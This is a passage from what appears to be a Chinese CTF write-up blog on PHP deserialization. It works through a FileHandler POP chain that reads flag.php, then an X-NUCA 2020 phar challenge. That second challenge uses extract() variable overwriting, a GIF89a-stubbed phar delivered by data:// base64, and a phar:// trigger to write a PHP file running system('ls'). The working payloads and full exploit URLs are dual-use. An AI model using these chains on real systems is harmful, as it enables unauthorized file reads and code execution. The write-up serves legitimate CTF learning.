$this-&gt;content);</span><br>    <span class="hljs-comment">//         if($res) $this-&gt;output(&quot;Successful!&quot;);</span><br>    <span class="hljs-comment">//         else $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125; else &#123;</span><br>    <span class="hljs-comment">//         $this-&gt;output(&quot;Failed!&quot;);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function read() &#123;</span><br>    <span class="hljs-comment">//     $res = &quot;&quot;;</span><br>    <span class="hljs-comment">//     if(isset($this-&gt;filename)) &#123;</span><br>    <span class="hljs-comment">//         $res = file_get_contents($this-&gt;filename);</span><br>    <span class="hljs-comment">//     &#125;</span><br>    <span class="hljs-comment">//     return $res;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// private function output($s) &#123;</span><br>    <span class="hljs-comment">//     echo &quot;[Result]: &lt;br&gt;&quot;;</span><br>    <span class="hljs-comment">//     echo $s;</span><br>    <span class="hljs-comment">// &#125;</span><br><br>    <span class="hljs-comment">// function __destruct() &#123;</span><br>    <span class="hljs-comment">//     if($this-&gt;op === &quot;2&quot;)</span><br>    <span class="hljs-comment">//         $this-&gt;op = &quot;1&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;content = &quot;&quot;;</span><br>    <span class="hljs-comment">//     $this-&gt;process();</span><br>    <span class="hljs-comment">// &#125;</span><br><br>&#125;<br><br><span class="hljs-comment">// echo urlencode(serialize(new FileHandler));</span><br><span class="hljs-comment">// O%3A11%3A%22FileHandler%22%3A3%3A%7Bs%3A5%3A%22%00%2A%00op%22%3Bi%3A2%3Bs%3A11%3A%22%00%2A%00filename%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A10%3A%22%00%2A%00content%22%3BN%3B%7D</span><br><span class="hljs-comment">// 因为上传的时候存在检测ascii码存在一定的范围</span><br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">decorate</span>(<span class="hljs-params"><span class="hljs-variable">$s</span></span>)</span>&#123;<br>    <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$s</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$arr</span>); <span class="hljs-variable">$i</span>++)&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>],<span class="hljs-string">&quot;\0&quot;</span>) != <span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;s&#x27;</span>,<span class="hljs-string">&#x27;S&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>]);<br>            <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;\0&quot;</span>,<span class="hljs-string">&#x27;\00&#x27;</span>,<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>]); <span class="hljs-comment">//注意区分单引号双引号</span><br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;替换后:&quot;</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;替换后:&quot;</span>.<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">2</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//拼接回来</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-variable">$arr</span>);<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">decorate</span>(<span class="hljs-variable">$ser</span>);<br><br><br><br><span class="hljs-comment">// function is_valid($s) &#123;</span><br><span class="hljs-comment">//     for($i = 0; $i &lt; strlen($s); $i++)</span><br><span class="hljs-comment">//         if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))</span><br><span class="hljs-comment">//             return false;</span><br><span class="hljs-comment">//     return true;</span><br><span class="hljs-comment">// &#125;</span><br><br><span class="hljs-comment">// if(isset($_GET&#123;&#x27;str&#x27;&#125;)) &#123;</span><br><br><span class="hljs-comment">//     $str = (string)$_GET[&#x27;str&#x27;];</span><br><span class="hljs-comment">//     if(is_valid($str)) &#123;</span><br><span class="hljs-comment">//         $obj = unserialize($str);</span><br><span class="hljs-comment">//     &#125;</span><br><br><span class="hljs-comment">// &#125;</span><br></code></pre></td></tr></table></figure><p>输出：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">5</span>:<span class="hljs-string">&quot; * op&quot;</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">&quot; * filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">&quot; * content&quot;</span>;N;&#125;<br><span class="hljs-string">&quot; * op&quot;</span>;i<br>&#123;s<br>替换后:<span class="hljs-string">&quot;\00*\00op&quot;</span>;i<br>替换后:&#123;S<br><span class="hljs-string">&quot; * filename&quot;</span>;s<br><span class="hljs-number">2</span>;s<br>替换后:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;s<br>替换后:<span class="hljs-number">2</span>;S<br><span class="hljs-string">&quot; * content&quot;</span>;N;&#125;<br><span class="hljs-string">&quot;flag.php&quot;</span>;s<br>替换后:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br>替换后:<span class="hljs-string">&quot;flag.php&quot;</span>;S<br>O:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;FileHandler&quot;</span>:<span class="hljs-number">3</span>:&#123;S:<span class="hljs-number">5</span>:<span class="hljs-string">&quot;\00*\00op&quot;</span>;i:<span class="hljs-number">2</span>;S:<span class="hljs-number">11</span>:<span class="hljs-string">&quot;\00*\00filename&quot;</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;flag.php&quot;</span>;S:<span class="hljs-number">10</span>:<span class="hljs-string">&quot;\00*\00content&quot;</span>;N;&#125;<br></code></pre></td></tr></table></figure><p>之所以会产生这些不可见0字符 是因为protected和private属性的原因导致 所以需要我们进行替换</p><p>传入后查看页面源代码成功获取flag：</p><p><img src="/.com//17476574315877288923840810046356-20250519202352-rzwpee6.png" alt="17476574315877288923840810046356"></p><p>同时这道题目也可以装瞎 把protected的属性改成public进行攻击</p><p>但是当时这道题目在读取文件<strong>析构函数切目录</strong>的时候不在当前目录 需要获取其绝对路径进行读取</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileHandler</span> </span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$op</span> = <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/proc/self/cmdline&#x27;</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><br>&#125;<br><br><span class="hljs-variable">$ser</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileHandler</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ser</span>;<br></code></pre></td></tr></table></figure><p>第二种方法 提前结束 快速析构</p><p>把属性值修改</p><p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p><p>改为</p><p>​<code>O:11:&quot;FileHandler&quot;:4:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125;</code>​</p><p>或者删除结尾的大括号</p><p>​<code>O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;i:2;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;</code>​</p><p>‍</p><h2 id="phar例题："><a href="#phar例题：" class="headerlink" title="phar例题："></a>phar例题：</h2><p><strong>X-NUCA 2020 Final</strong></p><ol><li>变量覆盖读template.php</li><li>变量覆盖写入无损phar文件</li><li>变量覆盖触发phar反序列化</li></ol><p>题目：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(E_ALL);<br><span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$sandbox</span>)) &#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$sandbox</span>);<br>&#125;<br><br><span class="hljs-keyword">include_once</span>(<span class="hljs-string">&#x27;template.php&#x27;</span>);<br><br><span class="hljs-comment">//                key     value</span><br><span class="hljs-variable">$template</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;tp1&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp1.tpl&#x27;</span>,<span class="hljs-string">&#x27;tp2&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp2.tpl&#x27;</span>,<span class="hljs-string">&#x27;tp3&#x27;</span>=&gt;<span class="hljs-string">&#x27;tp3.tpl&#x27;</span>);<br><br><br><span class="hljs-comment">//看似多余的东西往往是解题的关键</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>])) &#123;<br>    <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;var&#x27;</span>], EXTR_OVERWRITE);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tp&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$tp</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;tp&#x27;</span>];<br>       <span class="hljs-comment">//  判断tp是否为template中的key</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">array_key_exists</span>(<span class="hljs-variable">$tp</span>, <span class="hljs-variable">$template</span>) === <span class="hljs-literal">FALSE</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;No! You only have 3 template to reader&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-comment">//读取文件</span><br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$template</span>[<span class="hljs-variable">$tp</span>]);<br>    <span class="hljs-variable">$temp</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>(<span class="hljs-variable">$content</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Please choice one template to reader&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p><strong>小技巧：</strong>  在源代码中看似没有一点用处的东西可能会成为解题的关键 比如在这里面存在着extract方法，可以用于变量覆盖</p><p>分析题目我们发现 想要读取文件 只能是在template数组中进行读取 但是其内容已经写好固定了，所以需要我们对template数组进行变量覆盖</p><p>对var数组进行操作 去读取template.php文件的内容</p><p>key value</p><p>array(‘template’ =&gt; array(‘tp1’ =&gt; ‘template.php’))</p><p>把template数组中的tp1这个key 的 value换成 template.php</p><p>即传参<code>?var[template][tp1]=template.php</code>​</p><p><img src="/.com//17476580781468024852844359025089-20250519203439-s946w93.png" alt="17476580781468024852844359025089"></p><p>对upload后面的开始访问：<a href="http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html">http://122.114.252.87:1120/uploads/7cddc639132e5953bf969cc3c9b08fd7/67c8a41ae1c9406576160aaf0370816e.html</a></p><p>得到一段php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span>;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-variable">$content</span>;<br><span class="hljs-variable language_">$this</span>-&gt;pattern = <span class="hljs-string">&quot;/&#123;&#123;([a-z]+)&#125;&#125;/&quot;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;suffix = <span class="hljs-string">&quot;.html&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">render</span>();<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-comment">//必须利用里面的break跳出死循环 才能到危险函数</span><br><span class="hljs-keyword">while</span> (True) &#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$this</span>-&gt;pattern, <span class="hljs-variable">$this</span>-&gt;content, <span class="hljs-variable">$matches</span>)!==<span class="hljs-number">1</span>) <br><span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">global</span> $&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;)) &#123;<br><span class="hljs-variable language_">$this</span>-&gt;content = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$this</span>-&gt;pattern, $&#123;<span class="hljs-variable">$matches</span>[<span class="hljs-number">1</span>]&#125;, <span class="hljs-variable">$this</span>-&gt;content);<br>&#125; <br><span class="hljs-keyword">else</span>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>&#125;<br>        <span class="hljs-comment">//suffic的长度必须大于5</span><br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$this</span>-&gt;suffix)&gt;<span class="hljs-number">5</span>) &#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;error suffix&quot;</span>;<br><span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;/var/www/html/uploads/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&quot;/&quot;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;content) . <span class="hljs-variable language_">$this</span>-&gt;suffix;<br>        <span class="hljs-comment">//危险函数 需要走过来嗷</span><br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$this</span>-&gt;content);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Your html file is in &quot;</span> . <span class="hljs-variable">$filename</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>因为在这个类中存在获取文件的方法 但是没有反序列化的途径 所以很明显嗷 这是个<strong>phar</strong>的问题</p><p>根据phar的条件进行解题探索</p><p>file_put_contents： phar可利用的函数</p><p>先构造pop链生成phar文件</p><p>本地测试时注意修改我们的php.ini的配置文件</p><p> <img src="/.com//17476581091664899805473643872117-20250519203510-1ovs32j.png" alt="17476581091664899805473643872117"></p><p>避大坑！！！！ 可能我们修改了之后 但是在vscode中无法操作成功 原因在于版本不匹配</p><p>姿势1：修改ini之后 直接在本地访问该网页 然后就会在同级目录生成对应文件</p><p>姿势2：在cmd中输入<code>php -v</code>​查看一下电脑环境的默认php版本</p><p><img src="/.com//17476581185514129733610710164602-20250519203519-4vcfew4.png" alt="17476581185514129733610710164602"></p><p>然后在phpStudy中修改对于版本的ini文件进行访问</p><p>想要file_get_contents读取到我们的phar.phar的内容有两种方法：</p><ol><li>file_get_contents可以发起http请求 只需要我们把phar文件写到服务器上就可以</li><li>file_get_contents读取data:&#x2F;&#x2F;协议</li></ol><p><strong>data:&#x2F;&#x2F;的使用方式：</strong></p><p>首先构造好反序列化的payload 然后在尾部添加上phar的八股文</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$pattern</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$suffix</span> = <span class="hljs-string">&quot;.php&quot;</span>;<br><br>&#125;<br><span class="hljs-variable">$o</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Template</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;phar.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;GIF89a&quot;</span>.<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="hljs-comment">//设置stub，增加gif文件头</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$o</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();  <br><br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>这样执行成功后会在本地生成一个phar的文件</p><p>然后我们读取里面的信息</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$ph</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;phar.phar&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$ph</span>.<span class="hljs-string">&quot;\n&quot;</span>;   <span class="hljs-comment">//很多乱码 所以用base64加密一下</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$ph</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>out：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">GIF89a<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">__HALT_COMPILER</span>(); <span class="hljs-meta">?&gt;</span><br>�fO:<span class="hljs-number">8</span>:<span class="hljs-string">&quot;Template&quot;</span>:<span class="hljs-number">3</span>:&#123;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;content&quot;</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">&quot;&lt;?php system(&#x27;ls&#x27;);?&gt;&quot;</span>;s:<span class="hljs-number">7</span>:<span class="hljs-string">&quot;pattern&quot;</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">&quot;suffix&quot;</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;.php&quot;</span>;&#125;test.txty�d~ضtest�jKn<span class="hljs-string">&#x27; Ii�Fi۶� ޅF�GBMB</span><br><span class="hljs-string">R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</span><br></code></pre></td></tr></table></figure><p>data读取：</p><p>​<code>data://text/plain;base64,R0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8+DQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5/2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI=</code>​</p><p>那么现在我们如何让题目所在服务器读取我们的data？可以回想到该题目的第一个界面</p><p>我们使用<strong>变量覆盖的方法读取</strong>内容 ！！注意嗷 一定要url编码一下哈</p><p>​<code>http://122.114.252.87:1120/?var[template][tp1]=data%3A%2F%2Ftext%2Fplain%3Bbase64%2CR0lGODlhPD9waHAgX19IQUxUX0NPTVBJTEVSKCk7ID8%2BDQqcAAAAAQAAABEAAAABAAAAAABmAAAATzo4OiJUZW1wbGF0ZSI6Mzp7czo3OiJjb250ZW50IjtzOjIxOiI8P3BocCBzeXN0ZW0oJ2xzJyk7Pz4iO3M6NzoicGF0dGVybiI7TjtzOjY6InN1ZmZpeCI7czo0OiIucGhwIjt9CAAAAHRlc3QudHh0BAAAAHkXuWQEAAAADH5%2F2LYBAAAAAAAAdGVzdOpqS24nIEkYaaBGadu2kiDehUaeAgAAAEdCTUI%3D&amp;tp=tp1</code>​</p><p><img src="/.com//17476582446048249458991917343755-20250519203725-ec9ermw.png" alt="17476582446048249458991917343755"></p><p>写入成功</p><p><img src="/.com//17476582583645402199081299806411-20250519203739-x9hipvl.png" alt="17476582583645402199081299806411"></p><p><strong>触发phar：</strong></p><p>​<code>phar:///var/www/html/uploads/7cddc639132e5953bf969cc3c9b08fd7/6c50d8d7eaa92dc4998351838da62dcc.html</code>​继续使用刚刚的file_get_contents函数加变量覆盖进行读取</p><p>​<code>http://122.114.252.87:1120/?var[template][tp1]=phar%3A%2F%2F%2Fvar%2Fwww%2Fhtml%2Fuploads%2F7cddc639132e5953bf969cc3c9b08fd7%2F6c50d8d7eaa92dc4998351838da62dcc.html&amp;tp=tp1</code><img src="/.com//17476582766138360737958902537856-20250519203759-qo996jy.png" alt="17476582766138360737958902537856"></p><p>执行成功 成功获得php后缀</p><p>因为我的命令是ls 所以访问后结果是列出的内容</p><p><strong>测试phpinfo</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Template</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;<br><span 